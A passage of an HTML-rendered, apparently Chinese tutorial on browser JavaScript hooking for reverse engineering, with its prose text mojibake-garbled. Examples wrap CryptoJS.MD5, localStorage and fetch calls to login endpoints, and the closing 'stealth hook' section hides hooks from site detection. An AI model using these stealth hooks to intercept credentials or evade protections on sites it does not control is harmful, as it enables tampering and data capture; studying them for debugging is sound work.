<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalMD5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">;</span>
<span class="w">        </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalMD5</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [MD5] </span><span class="si">${</span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="si">}</span><span class="sb"> =&gt; </span><span class="si">${</span><span class="nx">result</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;âœ… All hooks installed!&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ä½¿ç”¨å»ºè®®">ä½¿ç”¨å»ºè®®</h2>

      <h3 id="åœ¨-devtools-console-ä¸­æ‰§è¡Œ">åœ¨ DevTools Console ä¸­æ‰§è¡Œ</h3>

      <ol>
        <li>æ‰“å¼€ DevTools</li>
        <li>åˆ‡æ¢åˆ° Console æ ‡ç­¾</li>
        <li>ç²˜è´´ Hook è„šæœ¬</li>
        <li>å›è½¦æ‰§è¡Œ</li>
        <li>åˆ·æ–°é¡µé¢æˆ–è§¦å‘æ“ä½œ</li>
      </ol>

      <h3 id="ä¿å­˜ä¸º-snippet">ä¿å­˜ä¸º Snippet</h3>

      <ol>
        <li>DevTools -> Sources -> Snippets</li>
        <li>æ–°å»º Snippet</li>
        <li>ç²˜è´´ Hook è„šæœ¬</li>
        <li><code>Ctrl+Enter</code> æ‰§è¡Œ</li>
      </ol>

      <h3 id="ä½¿ç”¨æµè§ˆå™¨æ’ä»¶">ä½¿ç”¨æµè§ˆå™¨æ’ä»¶</h3>

      <p>å¯ä»¥å°† Hook è„šæœ¬æ³¨å…¥åˆ° Tampermonkey ç­‰æ’ä»¶ä¸­ï¼Œå®ç°è‡ªåŠ¨åŠ è½½ã€‚</p>

      <hr />

      <h2 id="é«˜çº§-hook-æŠ€æœ¯">é«˜çº§ Hook æŠ€æœ¯</h2>

      <h3 id="ä½¿ç”¨-proxy-å®ç°æ·±åº¦æ‹¦æˆª">ä½¿ç”¨ Proxy å®ç°æ·±åº¦æ‹¦æˆª</h3>

      <p>ES6 Proxy æä¾›äº†æ›´å¼ºå¤§çš„æ‹¦æˆªèƒ½åŠ›ï¼Œå¯ä»¥æ‹¦æˆªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook æ•´ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">deepHookObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Object&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// å¦‚æœæ˜¯å‡½æ•°ï¼Œåˆ™åŒ…è£…å®ƒ</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">apply</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nx">prop</span><span class="p">)</span><span class="si">}</span><span class="sb">] è°ƒç”¨`</span><span class="p">);</span>
<span class="w">                        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   å‚æ•°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">                        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">                        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;   è¿”å›:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">},</span>

<span class="w">        </span><span class="nx">set</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ“ [</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nx">prop</span><span class="p">)</span><span class="si">}</span><span class="sb">] è®¾ç½®ä¸º:`</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ç¤ºä¾‹ï¼šHook æ•´ä¸ª localStorage</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">deepHookObject</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">localStorage</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;localStorage&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="æ€§èƒ½ä¼˜åŒ–æ¡ä»¶-hook">æ€§èƒ½ä¼˜åŒ–ï¼šæ¡ä»¶ Hook</h3>

      <p>é¿å…è¿‡åº¦æ—¥å¿—è¾“å‡ºå½±å“æ€§èƒ½ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ¡ä»¶ Hook - åªè®°å½•ç‰¹å®šæ¡ä»¶</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">INTERESTING_URLS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;/api/user&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/api/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/api/data&#39;</span><span class="p">];</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">shouldLog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">INTERESTING_URLS</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">pattern</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">pattern</span><span class="p">));</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">shouldLog</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸŒ [Fetch]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">shouldLog</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">clone</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ [Response]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">200</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="å‡½æ•°è°ƒç”¨æ ˆè¿½è¸ª">å‡½æ•°è°ƒç”¨æ ˆè¿½è¸ª</h3>

      <p>ç²¾ç¡®å®šä½å‡½æ•°è°ƒç”¨æ¥æºï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">hookWithStackTrace</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">methodName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>

<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ¯ [</span><span class="si">${</span><span class="nx">methodName</span><span class="si">}</span><span class="sb">] è¢«è°ƒç”¨`</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å‚æ•°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// è·å–è°ƒç”¨æ ˆ</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">().</span><span class="nx">stack</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">callerLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">stack</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">)[</span><span class="mf">2</span><span class="p">];</span><span class="w">  </span><span class="c1">// ç¬¬ä¸‰è¡Œæ˜¯è°ƒç”¨è€…</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è°ƒç”¨ä½ç½®:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">callerLine</span><span class="p">.</span><span class="nx">trim</span><span class="p">());</span>

<span class="w">        </span><span class="c1">// åªåœ¨ç‰¹å®šä½ç½®è§¦å‘æ–­ç‚¹</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">callerLine</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;encrypt&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ¡ä»¶æ–­ç‚¹</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="c1">// ç¤ºä¾‹ï¼šè¿½è¸ª MD5 è°ƒç”¨æ¥æº</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">hookWithStackTrace</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;MD5&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="hook-è®¡æ•°å™¨å’Œæ€§èƒ½åˆ†æ">Hook è®¡æ•°å™¨å’Œæ€§èƒ½åˆ†æ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">FunctionProfiler</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">stats</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Map</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">hook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">methodName</span><span class="p">,</span><span class="w"> </span><span class="nx">displayName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">stats</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">callCount</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">            </span><span class="nx">totalTime</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">            </span><span class="nx">minTime</span><span class="o">:</span><span class="w"> </span><span class="kc">Infinity</span><span class="p">,</span>
<span class="w">            </span><span class="nx">maxTime</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">stats</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">displayName</span><span class="p">,</span><span class="w"> </span><span class="nx">stats</span><span class="p">);</span>

<span class="w">        </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">stats</span><span class="p">.</span><span class="nx">callCount</span><span class="o">++</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">duration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">startTime</span><span class="p">;</span>
<span class="w">            </span><span class="nx">stats</span><span class="p">.</span><span class="nx">totalTime</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">duration</span><span class="p">;</span>
<span class="w">            </span><span class="nx">stats</span><span class="p">.</span><span class="nx">minTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">stats</span><span class="p">.</span><span class="nx">minTime</span><span class="p">,</span><span class="w"> </span><span class="nx">duration</span><span class="p">);</span>
<span class="w">            </span><span class="nx">stats</span><span class="p">.</span><span class="nx">maxTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">stats</span><span class="p">.</span><span class="nx">maxTime</span><span class="p">,</span><span class="w"> </span><span class="nx">duration</span><span class="p">);</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">report</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\n=== å‡½æ•°æ€§èƒ½æŠ¥å‘Š ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">stats</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">stats</span><span class="p">.</span><span class="nx">entries</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`\n</span><span class="si">${</span><span class="nx">name</span><span class="si">}</span><span class="sb">:`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  è°ƒç”¨æ¬¡æ•°: </span><span class="si">${</span><span class="nx">stats</span><span class="p">.</span><span class="nx">callCount</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  æ€»è€—æ—¶: </span><span class="si">${</span><span class="nx">stats</span><span class="p">.</span><span class="nx">totalTime</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  å¹³å‡è€—æ—¶: </span><span class="si">${</span><span class="p">(</span><span class="nx">stats</span><span class="p">.</span><span class="nx">totalTime</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">stats</span><span class="p">.</span><span class="nx">callCount</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  æœ€å°è€—æ—¶: </span><span class="si">${</span><span class="nx">stats</span><span class="p">.</span><span class="nx">minTime</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`  æœ€å¤§è€—æ—¶: </span><span class="si">${</span><span class="nx">stats</span><span class="p">.</span><span class="nx">maxTime</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">profiler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FunctionProfiler</span><span class="p">();</span>
<span class="nx">profiler</span><span class="p">.</span><span class="nx">hook</span><span class="p">(</span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;send&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;XHR.send&#39;</span><span class="p">);</span>
<span class="nx">profiler</span><span class="p">.</span><span class="nx">hook</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Fetch&#39;</span><span class="p">);</span>

<span class="c1">// ç¨åæŸ¥çœ‹æŠ¥å‘Š</span>
<span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">profiler</span><span class="p">.</span><span class="nx">report</span><span class="p">(),</span><span class="w"> </span><span class="mf">10000</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="é˜²å¾¡æ€§-hook-é¿å…è¢«æ£€æµ‹">é˜²å¾¡æ€§ Hook - é¿å…è¢«æ£€æµ‹</h3>

      <p>æœ‰äº›ç½‘ç«™ä¼šæ£€æµ‹ Hook ç—•è¿¹ï¼Œéœ€è¦æ›´éšè”½çš„æ–¹å¼ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³•1: ä½¿ç”¨ Proxy ä¿æŒå‡½æ•°ç‰¹æ€§</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">stealthHook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="nx">handler</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">prop</span><span class="p">];</span>

<span class="w">    </span><span class="c1">// åˆ›å»º Proxyï¼Œä¿ç•™åŸå‡½æ•°çš„æ‰€æœ‰å±æ€§</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">original</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">handler</span><span class="p">.</span><span class="nx">before</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">handler</span><span class="p">.</span><span class="nx">before</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="nx">handler</span><span class="p">.</span><span class="nx">after</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">handler</span><span class="p">.</span><span class="nx">after</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// å¤åˆ¶åŸå‡½æ•°çš„å±æ€§</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">setPrototypeOf</span><span class="p">(</span><span class="nx">proxy</span><span class="p">,</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nx">original</span><span class="p">));</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">proxy</span><span class="p">,</span>
<span class="w">        </span><span class="nx">writable</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nx">enumerable</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nx">configurable</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// æ–¹æ³•2: ä¿æŒ toString() ä¸€è‡´</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">invisibleHook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">methodName</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">];</span>
